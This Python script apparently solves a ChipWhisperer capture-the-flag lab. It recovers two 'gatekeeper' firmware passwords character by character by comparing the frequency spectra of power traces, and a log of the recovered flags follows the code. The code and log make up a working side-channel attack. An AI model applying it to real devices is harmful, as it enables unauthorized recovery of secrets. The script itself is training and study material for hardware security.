from pathlib import Path
import sys

# Adding parent directory to the path to access utils
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from utils.remote_cw import remote_cw, RemoteConfig
from utils.helper_cv import setup_cw, cap_pass_trace, plot_traces, PLATFORM
import numpy as np
import matplotlib.pyplot as plt
from rpyc.utils.classic import obtain

cfg = RemoteConfig(
    host="remotechipwhisperer.example", # replace with hostname of the remote pi or its IP address
    user="pi",
    key_filename="/home/nect/.ssh/id_ed25519", # replace with your private key path
    port=18812,                  # must match the rpyc_classic on the Pi
    connect_host="127.0.0.1",    # local end (your machine)
    remote_host="127.0.0.1",     # remote rpyc_classic bind address
)


def main():
    with remote_cw(cfg) as cw:
        # This runs on the REMOTE machine inside the venv!
        scope, target, prog = setup_cw(cw,cw.scope())

        # Setting up the scope for capturing
        scope.adc.samples = 100000
        BAUD = target.baud
        CLOCK = scope.io.clkout
        NEWCLOCK = 30e6
        scope.io.clkout = NEWCLOCK
        NEWCLOCK = scope.io.clkout
        target.baud = BAUD * NEWCLOCK / CLOCK
        scope.adc.clk_freq = 3750000.0
        print(f"[+] Changed baud rate from {BAUD} to {target.baud}")
        print(f"[+] Changed clkout from {CLOCK} to {NEWCLOCK}")

        # Setup the target for simpleserial
        cw.put_file("gatekeeper-{}.hex".format(PLATFORM), "gatekeeper-{}.hex".format(PLATFORM))
        cw.program_target(scope, prog, "/home/pi/remote_files/gatekeeper-{}.hex".format(PLATFORM))
        print("[+] Programmed target with gatekeeper-{}.hex".format(PLATFORM))

        # Attack loop for gk1
        print("="*20)
        print("[+] Starting attack for gk1")
        print("="*20)
        flag = b''
        prefix = b"gk1{"
        postfix = b"}"
        for i in range(len(flag), 8):
            # Get reference trace using a wrong guess
            pass_guess = prefix + flag + b'\x01'*(8-i) + postfix
            reference_trace = obtain(cap_pass_trace(scope, target, pass_guess, command="a"))
            dft_reference_trace = np.abs(np.fft.rfft(reference_trace))

            # Brute-force each character
            best_char = None
            max_diff = 0
            for c in b'abcdefghijklmnopqrstuvwxyz0123456789_':
                pass_guess = prefix + flag + bytes([c]) + b'\x01'*(7-i) + postfix
                trace = obtain(cap_pass_trace(scope, target, pass_guess, command="a"))
                dft_trace = np.abs(np.fft.rfft(trace))
                diff = np.sum(np.abs(dft_trace - dft_reference_trace))
                if diff > max_diff:
                    max_diff = diff
                    best_char = c
            flag += bytes([best_char])
            print(f"[+] Found character {i+1}: {flag}")
        print(f"[+] Found flag: gk1{{{flag.decode()}}}")
        flag = prefix + flag + postfix
        # Check if the found flag is correct
        cap_pass_trace(scope, target, flag, command="a", verbose=True)

        # Reset target for the next challenge
        cw.program_target(scope, prog, "/home/pi/remote_files/gatekeeper-{}.hex".format(PLATFORM))
        print("[+] Reprogrammed target with gatekeeper-{}.hex".format(PLATFORM))

        # Attack loop for gk2
        print("="*20)
        print("[+] Starting attack for gk2")
        print("="*20)
        flag = b''
        prefix = b"gk2{"
        postfix = b"}"
        for i in range(len(flag), 12):
            # Get reference trace using a wrong guess
            pass_guess = prefix + flag + b'\x01'*(12-i) + postfix
            reference_trace = obtain(cap_pass_trace(scope, target, pass_guess, command="b"))
            dft_reference_trace = np.abs(np.fft.rfft(reference_trace))

            # Brute-force each character
            best_char = None
            max_diff = 0
            for c in b'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ':
                pass_guess = prefix + flag + bytes([c]) + b'\x01'*(11-i) + postfix
                trace = obtain(cap_pass_trace(scope, target, pass_guess, command="b"))
                dft_trace = np.abs(np.fft.rfft(trace))
                diff = np.sum(np.abs(dft_trace - dft_reference_trace))
                if diff > max_diff:
                    max_diff = diff
                    best_char = c
            flag += bytes([best_char])
            print(f"[+] Found character {i+1}: {flag}")
        print(f"[+] Found flag: gk2{{{flag.decode()}}}")
        # Check if the found flag is correct
        flag = prefix + flag + postfix
        cap_pass_trace(scope, target, flag, command="b", verbose=True)

if __name__ == "__main__":
    main()



# ====================
# [+] Starting attack for gk1
# ====================
# [+] Found character 1: b'l'
# [+] Found character 2: b'l0'
# [+] Found character 3: b'l0g'
# [+] Found character 4: b'l0g1'
# [+] Found character 5: b'l0g1n'
# [+] Found character 6: b'l0g1np'
# [+] Found character 7: b'l0g1npw'
# [+] Found character 8: b'l0g1npwn'
# [+] Found flag: gk1{l0g1npwn}
# [+] Response: None
# [+] Reprogrammed target with gatekeeper-CWNANO.hex
# ====================
# [+] Starting attack for gk2
# ====================
# [+] Found character 1: b'7'
# [+] Found character 2: b'7r'
# [+] Found character 3: b'7rU'
# [+] Found character 4: b'7rU3'
# [+] Found character 5: b'7rU3n'
# [+] Found character 6: b'7rU3nc'
# [+] Found character 7: b'7rU3ncr'
# [+] Found character 8: b'7rU3ncrY'
# [+] Found character 9: b'7rU3ncrYk'
# [+] Found character 10: b'7rU3ncrYkI'
# [+] Found character 11: b'7rU3ncrYkIN'
# [+] Found character 12: b'7rU3ncrYkIND'
# [+] Found flag: gk2{7rU3ncrYkIND}
# [+] Response: None
